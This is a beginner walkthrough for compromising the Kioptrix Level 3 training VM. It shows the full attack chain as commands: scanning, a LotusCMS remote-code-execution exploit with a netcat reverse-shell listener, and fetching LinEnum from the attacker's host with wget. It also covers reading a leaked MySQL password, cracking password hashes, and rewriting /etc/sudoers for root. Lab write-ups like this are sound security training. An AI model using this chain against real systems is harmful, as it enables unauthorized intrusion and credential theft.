# Kioptrix Level 3 Walkthrough - Beginner-Friendly Guide  

Welcome to another exciting challenge in the Kioptrix series! This walkthrough will guide you step-by-step through rooting *Kioptrix Level 3*, a vulnerable virtual machine designed for beginners.  

---

## Introduction  

### What Makes This Challenge Different?  
This challenge introduces a few more steps and new skills while still being accessible for beginners. However, "easy" or "difficult" is relative to your skill level. Remember, every expert was once a beginner, and creating these vulnerable VMs is no easy feat!  

### What Will You Learn?  
- *Scanning and enumeration* techniques to discover hidden services.  
- *Exploiting web applications* like phpMyAdmin and LotusCMS.  
- *Finding credentials* and cracking hashes.  
- *Privilege escalation* using sudo misconfigurations.  

Let’s dive in and root this machine!

---

## Step 1: Scanning and Enumeration  
*Goal:* Identify open ports and services running on the target machine.  

### Nmap Scan  
We start with a basic Nmap scan to detect open ports and service versions.  

#### Command:  
```bash
nmap -T4 -sV <ipaddress>

-T4: Faster scan speed (be cautious as it’s noisier).

-sV: Detects the version of services running on open ports.


Results:

The scan reveals a web server running.


---

Directory Enumeration

Since there’s a web server, let’s look for hidden directories using Gobuster.

Command:

gobuster dir -u http://<ipaddress> -w /path/to/wordlist

Replace <ipaddress> with the target’s IP.

Use your preferred wordlist (e.g., /usr/share/wordlists/dirb/common.txt).


Results:

Among the directories found, /phpmyadmin is of interest.


---

Step 2: Exploring phpMyAdmin

Goal: Check for vulnerabilities in the phpMyAdmin panel.

1. Navigate to http://<ipaddress>/phpmyadmin.


2. Try default credentials:

Username: admin

Password: (leave blank)




Results:

We gain access, but with no significant privileges. We need valid user credentials to proceed further.


---

Step 3: Discovering LotusCMS

Goal: Identify the Content Management System (CMS) and exploit it.

CMS Detection

Navigate to the main web page (http://<ipaddress>). The Login screen reveals the CMS in use: LotusCMS.

Researching Vulnerabilities

A quick search shows LotusCMS 3.0 has a vulnerability in its Router() function, allowing Remote Command Execution (RCE) via the page parameter.

Exploit:

The exploit script is available on GitHub and Exploit-DB:

Hood3dRob1n/LotusCMS-Exploit

Exploit-DB LotusCMS RCE



---

Running the Exploit

1. Download the exploit script.


2. Assign execute permissions:

chmod +x lotusRCE.sh


3. Execute the script:

./lotusRCE.sh <ipaddress> /

<ipaddress>: Target IP.

/: Path to the CMS.




Setting Up a Reverse Shell

1. Open a listener on your machine:

nc -lvp 1337


2. Follow the exploit prompts to configure the connection.



Result:

You’ll now have a shell on the target!


---

Step 4: Privilege Escalation

Goal: Gain root access to the system.

Enumerating the System

Run LinEnum.sh on the target to gather privilege escalation hints:

1. Download LinEnum:

wget http://<your-ip>:8000/LinEnum.sh


2. Execute it:

chmod +x LinEnum.sh  
./LinEnum.sh



Findings:

A .bak file (gconfig.php) contains the MySQL root password.


---

Using phpMyAdmin

1. Log into phpMyAdmin using the MySQL root credentials.


2. Select the gallery database and query the dev_accounts table:

SELECT * FROM dev_accounts;



Results:

You’ll retrieve hashed passwords for users.


---

Cracking Password Hashes

The hashes appear to be MD5. Use CrackStation to crack them.

Results:

User 1: Dreg

User 2: loneferret



---

Logging in via SSH

1. Use the cracked credentials to log in as loneferret:

ssh loneferret@<ipaddress>


2. Check sudo privileges:

sudo -l



Results:

loneferret can run ht (a file editor) as root.


---

Exploiting ht for Root Access

1. Run ht as root:

sudo ht

If you encounter an error:

export TERM=xterm


2. Edit the /etc/sudoers file:

Press F3 to search for /etc/sudoers.

Add this to the loneferret line:

/bin/bash



3. Save and exit.


4. Run the following to get a root shell:

sudo /bin/bash




---

Conclusion

Congratulations! You’ve successfully rooted Kioptrix Level 3.

Key Takeaways:

Always validate inputs to prevent RCE vulnerabilities.

Secure configuration of web applications like phpMyAdmin is critical.

Keep systems updated to mitigate exploits.


This machine might be labeled "beginner," but it provides valuable lessons and challenges. Feel free to ask questions in the comments, and happy hacking!
